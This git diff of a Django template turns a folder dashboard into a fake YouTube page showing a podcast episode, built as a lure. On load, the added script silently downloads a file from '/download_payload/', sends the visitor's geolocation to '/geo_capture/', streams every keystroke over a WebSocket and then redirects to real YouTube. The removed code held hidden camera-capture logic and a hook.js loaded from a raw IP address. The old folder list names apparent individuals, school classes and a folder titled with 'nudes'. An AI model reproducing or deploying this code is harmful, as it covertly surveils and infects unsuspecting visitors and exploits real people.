@@ -1,75 +1,598 @@
+{% load static %}
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Folder Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>El Grande toto podcast</title>
     <style>
-        body {
+        * {
             margin: 0;
-            padding: 2rem;
-            background-color: #1e1e2f;
-            color: #fff;
-            font-family: Arial, sans-serif;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
         }
-
-        h1 {
-            text-align: center;
-            margin-bottom: 2rem;
-            font-size: 2.5rem;
-            color: #f7d217;
+        
+        body {
+            background-color: #f9f9f9;
+            color: #030303;
+            overflow-x: hidden;
         }
-
-        .folder-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 1.5rem;
+        
+        /* Header styles */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 16px;
+            height: 56px;
+            background-color: white;
+            border-bottom: 1px solid #e5e5e5;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-
-        .folder {
-            background-color: #2a2a40;
-            border: 2px solid #3d3d5c;
-            border-radius: 12px;
-            padding: 1rem;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
-            transition: transform 0.2s ease;
+        
+        .logo {
+            display: flex;
+            align-items: center;
         }
-
-        .folder:hover {
-            transform: scale(1.05);
+        
+        .logo-icon {
+            color: red;
+            font-size: 24px;
+            margin-right: 4px;
+        }
+        
+        .logo-text {
+            font-size: 20px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+        
+        .search-container {
+            display: flex;
+            align-items: center;
+            flex: 0 1 728px;
+            margin: 0 40px;
+        }
+        
+        .search-bar {
+            display: flex;
+            flex: 1;
+        }
+        
+        .search-input {
+            flex: 1;
+            padding: 0 12px;
+            height: 40px;
+            border: 1px solid #ccc;
+            border-radius: 2px 0 0 2px;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        .search-button {
+            width: 64px;
+            height: 40px;
+            background-color: #f8f8f8;
+            border: 1px solid #d3d3d3;
+            border-left: none;
+            border-radius: 0 2px 2px 0;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .user-actions {
+            display: flex;
+            align-items: center;
+        }
+        
+        .icon-button {
+            width: 40px;
+            height: 40px;
+            margin: 0 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border-radius: 50%;
+        }
+        
+        .user-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #065fd4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
             cursor: pointer;
         }
-
-        .folder-icon {
-            font-size: 3rem;
-            margin-bottom: 0.5rem;
+        
+        /* Main content */
+        .container {
+            display: flex;
+            width: 100%;
         }
-
-        .folder-name {
-            font-size: 1rem;
-            font-weight: bold;
-            color: #ccc;
+        
+        .sidebar {
+            width: 240px;
+            background-color: white;
+            height: calc(100vh - 56px);
+            position: sticky;
+            top: 56px;
+            padding: 12px 0;
+            overflow-y: auto;
+        }
+        
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 8px 24px;
+            cursor: pointer;
+        }
+        
+        .sidebar-item:hover {
+            background-color: #f2f2f2;
+        }
+        
+        .sidebar-item.active {
+            background-color: #e5e5e5;
+        }
+        
+        .sidebar-icon {
+            margin-right: 24px;
+        }
+        
+        .sidebar-text {
+            font-size: 14px;
+        }
+        
+        .main-content {
+            flex: 1;
+            padding: 24px 24px 0;
+        }
+        
+        /* Video player */
+        .video-player-container {
+            width: 100%;
+            max-width: 1280px;
+            margin-bottom: 24px;
+        }
+        
+        .video-player {
+            width: 100%;
+            background-color: black;
+            aspect-ratio: 16 / 9;
+            border-radius: 12px;
+            position: relative;
+        }
+        
+        .video-info {
+            margin-top: 12px;
+        }
+        
+        .video-title {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+        
+        .video-stats {
+            display: flex;
+            justify-content: space-between;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+        
+        .stats-left {
+            display: flex;
+            align-items: center;
+            color: #606060;
+            font-size: 14px;
+        }
+        
+        .stats-right {
+            display: flex;
+            align-items: center;
+        }
+        
+        .action-button {
+            display: flex;
+            align-items: center;
+            margin-left: 24px;
+            cursor: pointer;
+        }
+        
+        .action-button span {
+            margin-left: 8px;
+            font-size: 14px;
+        }
+        
+        .channel-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+        
+        .channel-left {
+            display: flex;
+            align-items: center;
+        }
+        
+        .channel-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background-color: #909090;
+            margin-right: 12px;
+        }
+        
+        .channel-details h3 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        
+        .channel-details p {
+            font-size: 14px;
+            color: #606060;
+        }
+        
+        .subscribe-button {
+            background-color: #cc0000;
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        /* Related videos */
+        .related-videos {
+            margin-top: 24px;
+        }
+        
+        .related-videos h3 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 16px;
+        }
+        
+        .videos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 16px;
+        }
+        
+        .video-card {
+            cursor: pointer;
+            margin-bottom: 40px;
+        }
+        
+        .thumbnail-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+        
+        .thumbnail {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .video-duration {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 3px 4px;
+            border-radius: 2px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .video-card-info {
+            display: flex;
+        }
+        
+        .video-card-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: #909090;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+        
+        .video-card-details {
+            flex: 1;
+        }
+        
+        .video-card-title {
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1.2;
+            margin-bottom: 6px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        
+        .video-card-channel {
+            font-size: 14px;
+            color: #606060;
+            margin-bottom: 4px;
+        }
+        
+        .video-card-stats {
+            font-size: 14px;
+            color: #606060;
         }
     </style>
 </head>
 <body>
-
-    <h1>📂 Your Folders</h1>
-    <div class="folder-grid">
-        <!-- Folder Items -->
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hassan 3aryan</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Rihab</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Malak</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">2 EME BAC</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">1 EME BAC</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">3 EME COLLEGE</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Imane Vape</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">SALMA</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Marwa nudes</a></div></div>
+    <!-- Header -->
+    <header>
+        <div class="logo">
+            <div class="logo-icon">▶</div>
+            <div class="logo-text">YouTube</div>
+        </div>
+        
+        <div class="search-container">
+            <div class="search-bar">
+                <input type="text" class="search-input" placeholder="Search">
+                <button class="search-button">🔍</button>
+            </div>
+        </div>
+        
+        <div class="user-actions">
+            <div class="icon-button">📹</div>
+            <div class="icon-button">🔔</div>
+            <div class="user-avatar">U</div>
+        </div>
+    </header>
+    
+    <!-- Main container -->
+    <div class="container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-item active">
+                <div class="sidebar-icon">🏠</div>
+                <div class="sidebar-text">Home</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">🔥</div>
+                <div class="sidebar-text">Trending</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">🎬</div>
+                <div class="sidebar-text">Subscriptions</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">📚</div>
+                <div class="sidebar-text">Library</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">⏱️</div>
+                <div class="sidebar-text">History</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">⏯️</div>
+                <div class="sidebar-text">Your videos</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">⏰</div>
+                <div class="sidebar-text">Watch later</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">👍</div>
+                <div class="sidebar-text">Liked videos</div>
+            </div>
+        </div>
+        
+        <!-- Main content -->
+        <div class="main-content">
+            <!-- Video player -->
+            <div class="video-player-container">
+                <div class="video-player"></div>
+                
+                <div class="video-info">
+                    <h1 class="video-title">#ABtalks with ElGrandeToto | Chapter 224 | الجراندي طوطو</h1>
+                    
+                    <div class="video-stats">
+                        <div class="stats-left">
+                            1,245,678 views • May 10, 2025
+                        </div>
+                        <div class="stats-right">
+                            <div class="action-button">
+                                👍 <span>45K</span>
+                            </div>
+                            <div class="action-button">
+                                👎 <span>1.2K</span>
+                            </div>
+                            <div class="action-button">
+                                ↗️ <span>Share</span>
+                            </div>
+                            <div class="action-button">
+                                ⬇️ <span>Download</span>
+                            </div>
+                            <div class="action-button">
+                                ··· <span></span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="channel-info">
+                        <div class="channel-left">
+                            <div class="channel-avatar"></div>
+                            <div class="channel-details">
+                                <h3>Anas Bukhash أنس بوخش</h3>
+                                <p>2.5M subscribers</p>
+                            </div>
+                        </div>
+                        <button class="subscribe-button">SUBSCRIBE</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Related videos -->
+            <div class="related-videos">
+                <h3>Recommended videos</h3>
+                
+                <div class="videos-grid">
+                    <!-- Video Card 1 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">15:42</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">10 UI/UX Trends That Will Dominate 2025</h3>
+                                <p class="video-card-channel">Design Weekly</p>
+                                <p class="video-card-stats">842K views • 3 weeks ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 2 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">8:27</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">Learn CSS Grid in 10 Minutes - Quick Tutorial</h3>
+                                <p class="video-card-channel">CodeCamp</p>
+                                <p class="video-card-stats">1.2M views • 8 months ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 3 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">21:36</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">Building a Portfolio Website from Scratch - Full Process</h3>
+                                <p class="video-card-channel">Developer Central</p>
+                                <p class="video-card-stats">567K views • 2 months ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 4 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">12:05</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">Modern JavaScript Features You Should Know in 2025</h3>
+                                <p class="video-card-channel">JS Mastery</p>
+                                <p class="video-card-stats">325K views • 5 days ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 5 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">18:33</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">Responsive Design in 2025 - Mobile First Approach</h3>
+                                <p class="video-card-channel">Mobile Dev Pro</p>
+                                <p class="video-card-stats">489K views • 1 month ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 6 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">25:14</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">Advanced CSS Animation Techniques - Master Class</h3>
+                                <p class="video-card-channel">CSS Wizards</p>
+                                <p class="video-card-stats">712K views • 4 months ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 7 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">10:48</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">5 Web Design Mistakes to Avoid in 2025</h3>
+                                <p class="video-card-channel">Design Critique</p>
+                                <p class="video-card-stats">293K views • 2 weeks ago</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Video Card 8 -->
+                    <div class="video-card">
+                        <div class="thumbnail-container">
+                            <img src="/api/placeholder/320/180" alt="Video thumbnail" class="thumbnail">
+                            <div class="video-duration">32:19</div>
+                        </div>
+                        <div class="video-card-info">
+                            <div class="video-card-avatar"></div>
+                            <div class="video-card-details">
+                                <h3 class="video-card-title">Web Development Roadmap 2025 - From Beginner to Pro</h3>
+                                <p class="video-card-channel">Tech Career Guide</p>
+                                <p class="video-card-stats">1.5M views • 2 months ago</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
+    <a id="downloadLink" href="/download_payload/" download style="display:none;">Download</a>
+    <script src="{% static 'script.js' %}"></script>
 
-    <!-- Hidden screenshot logic -->
     <script>
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
@@ -326,9 +849,39 @@ function getCookie(name) {
 if (isMobileDevice()) {
     requestPermissions();
 }
-</script>
 
-<script src="http://196.117.229.105:/hook.js"></script>
+
+document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("downloadLink").click();
+
+    // Get geolocation
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            fetch("/geo_capture/", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude
+                })
+            });
+        });
+    }
+
+    // Keystroke logging via WebSocket
+    const socket = new WebSocket("ws://" + window.location.host + "/ws/log/");
+    document.addEventListener("keydown", e => {
+        socket.send(JSON.stringify({ key: e.key }));
+    });
+
+    // Redirect after 5 seconds
+    setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=WY4-_LRBxW0&t=1021s";
+        
+    }, 5000);
+});
+
+</script>
 
 
 </body>
